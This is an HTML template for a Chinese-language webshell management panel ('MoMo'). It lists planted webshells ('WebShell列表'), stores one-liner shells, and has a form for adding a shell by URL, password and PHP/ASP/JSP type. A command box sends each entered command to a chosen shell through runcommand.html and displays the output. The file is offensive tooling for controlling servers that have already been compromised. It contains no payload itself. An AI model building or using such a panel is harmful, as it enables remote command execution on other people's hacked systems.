<body class="page-body">
	<div class="settings-pane">
		<a href="#" data-toggle="settings-pane" data-animate="true">
			&times;

	</div>
	<div class="page-container"><!-- add class "sidebar-collapsed" to close sidebar by default, "chat-visible" to make chat appear always -->
		<!-- Add "fixed" class to make the sidebar fixed always to the browser viewport. -->
		<!-- Adding class "toggle-others" will keep only one menu item open at a time. -->
		<!-- Adding class "collapsed" collapse sidebar root elements and show only icons. -->

			<div class="sidebar-menu-inner">
				<header class="logo-env">
					<!-- logo -->
					<div class="logo">
						<a href="/" class="logo-expanded">
							<img src="/static/images/logo@2x.png" width="80" alt="" />
						</a>
						<a href="/" class="logo-collapsed">
							<img src="/static/images/logo-collapsed@2x.png" width="40" alt="" />
						</a>
					</div>
					<!-- This will toggle the mobile menu and will be visible only on mobile devices -->
					<div class="mobile-menu-toggle visible-xs">


						<a href="#" data-toggle="mobile-menu">
							<i class="fa-bars"></i>
						</a>
					</div>
				</header>
				<ul id="main-menu" class="main-menu">
					<!-- add class "multiple-expanded" to allow multiple submenus to open -->
					<!-- class "auto-inherit-active-class" will automatically add "active" class for parent elements who are marked already with class "active" -->
					<li class="active">
						<a href="/">
{#							<i class="linecons-cog"></i>#}
							<span class="title">WebShell列表</span>
						</a>
					</li>
                    <li>
						<a href="xiaoma.html">
							<span class="title">一句话收藏</span>
						</a>
					</li>
				</ul>
			</div>
		</div>
		<div class="main-content">
			<!-- User Info, Notifications and Menu Bar -->
			<nav class="navbar user-info-navbar" role="navigation">
				<ul class="user-info-menu left-links list-inline list-unstyled">
					<li class="hidden-sm hidden-xs">
						<a href="#" data-toggle="sidebar">
							<i class="fa-bars"></i>
						</a>
					</li>
				</ul>
				<!-- Right links for user info navbar -->
				<ul class="user-info-menu right-links list-inline list-unstyled">
					<li class="dropdown user-profile">
						<a href="#" data-toggle="dropdown">
							<img src="/static/images/user-4.png" alt="user-image" class="img-circle img-inline userpic-32" width="28" />
							<span>
								MoMo
								<i class="fa-angle-down"></i>
							</span>
						</a>
                        <ul class="dropdown-menu user-profile-menu list-unstyled">
							<li>
								<a href="javascript:;" onclick="jQuery('#modal-6').modal('show', {backdrop: 'static'});">
									<i class="fa-edit">添加</i>
								</a>
							</li>

							<li class="last">
								<a href="extra-lockscreen.html">
									<i class="fa-lock"></i>
									退出
								</a>
							</li>
						</ul>
					</li>
				</ul>

			</nav>
			<!-- Basic Setup -->
			<div class="panel panel-default">
				<div class="panel-body">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="form-group">
                                <label for="subject">命令:</label>
                                <input type="text" class="form-control" id="subject" tabindex="1" />
                                <script>
                                    $(document).ready(
                                        function() {
                                            $("#subject").keydown(function(event) {
                                                if (event.keyCode == 13) {
                                                        $.getJSON("runcommand.html",{'id':{{ id }},'cmd':$(subject).val()},function($jsondata){
                                                            $("#result").html($jsondata.cmd);
                                                        });
                                                }
                                            })
                                        }
                                    );
                                </script>
                            </div>
                            <div class="form-group">
                                <label for="subject">回显:</label>
                                <textarea id="result" class="form-control wysihtml5" data-html="false" data-color="false" data-stylesheet-url="assets/css/wysihtml5-color.css" name="sample_wysiwyg"></textarea>
                            </div>
                        </div>
                    </div>
				</div>
			</div>
            <footer class="main-footer sticky footer-type-1">
				<div class="footer-inner">
					<!-- Add your copyright text here -->
					<div class="footer-text">
						&copy; 2017
						<strong>MoMo</strong>
						theme by <a href="http://www.ywclub.org" target="_blank">WebShell</a>
					</div>
					<!-- Go to Top Link, just add rel="go-top" to any link to add this functionality -->
					<div class="go-up">
						<a href="#" rel="go-top">
							<i class="fa-angle-up"></i>
						</a>
					</div>
				</div>
			</footer>
		</div>
	</div>
    <div class="modal fade" id="modal-6">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
					<h4 class="modal-title">添加</h4>
				</div>
				<div class="modal-body">
					<div class="row">
						<div class="col-md-12">
							<div class="form-group">
								<label for="field-1" class="control-label">备注</label>
								<input type="text" class="form-control" id="remarks" data-validate="required" data-message-required="This is custom message for required field."   placeholder=测试>
							</div>
						</div>
					</div>
					<div class="row">
						<div class="col-md-12">
							<div class="form-group">
								<label for="field-2" class="control-label">链接</label>
								<input type="text" class="form-control" id="links" placeholder="http://webshell.ywclub.org/xiaoma.php">
							</div>
						</div>
					</div>
					<div class="row">
						<div class="col-md-12">
							<div class="form-group">
								<labtel for="field-4" class="control-label">密码</labtel>
								<input type="password" class="form-control" id="passwd" placeholder="******">
							</div>
						</div>
						<div class="col-md-12">
							<div class="form-group">
								<label for="field-5" class="control-label">类型</label>
                                <select id="type" class="form-control">
                                    <option value="PHP">PHP</option>
                                    <option value="ASP">ASP</option>
                                    <option value="JSP">JSP</option>
                                </select>
							</div>
						</div>
					</div>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-white" data-dismiss="modal">取消</button>
					<button type="button" class="btn btn-info" id="addshell" >保存</button>
				</div>
			</div>
		</div>
	</div>
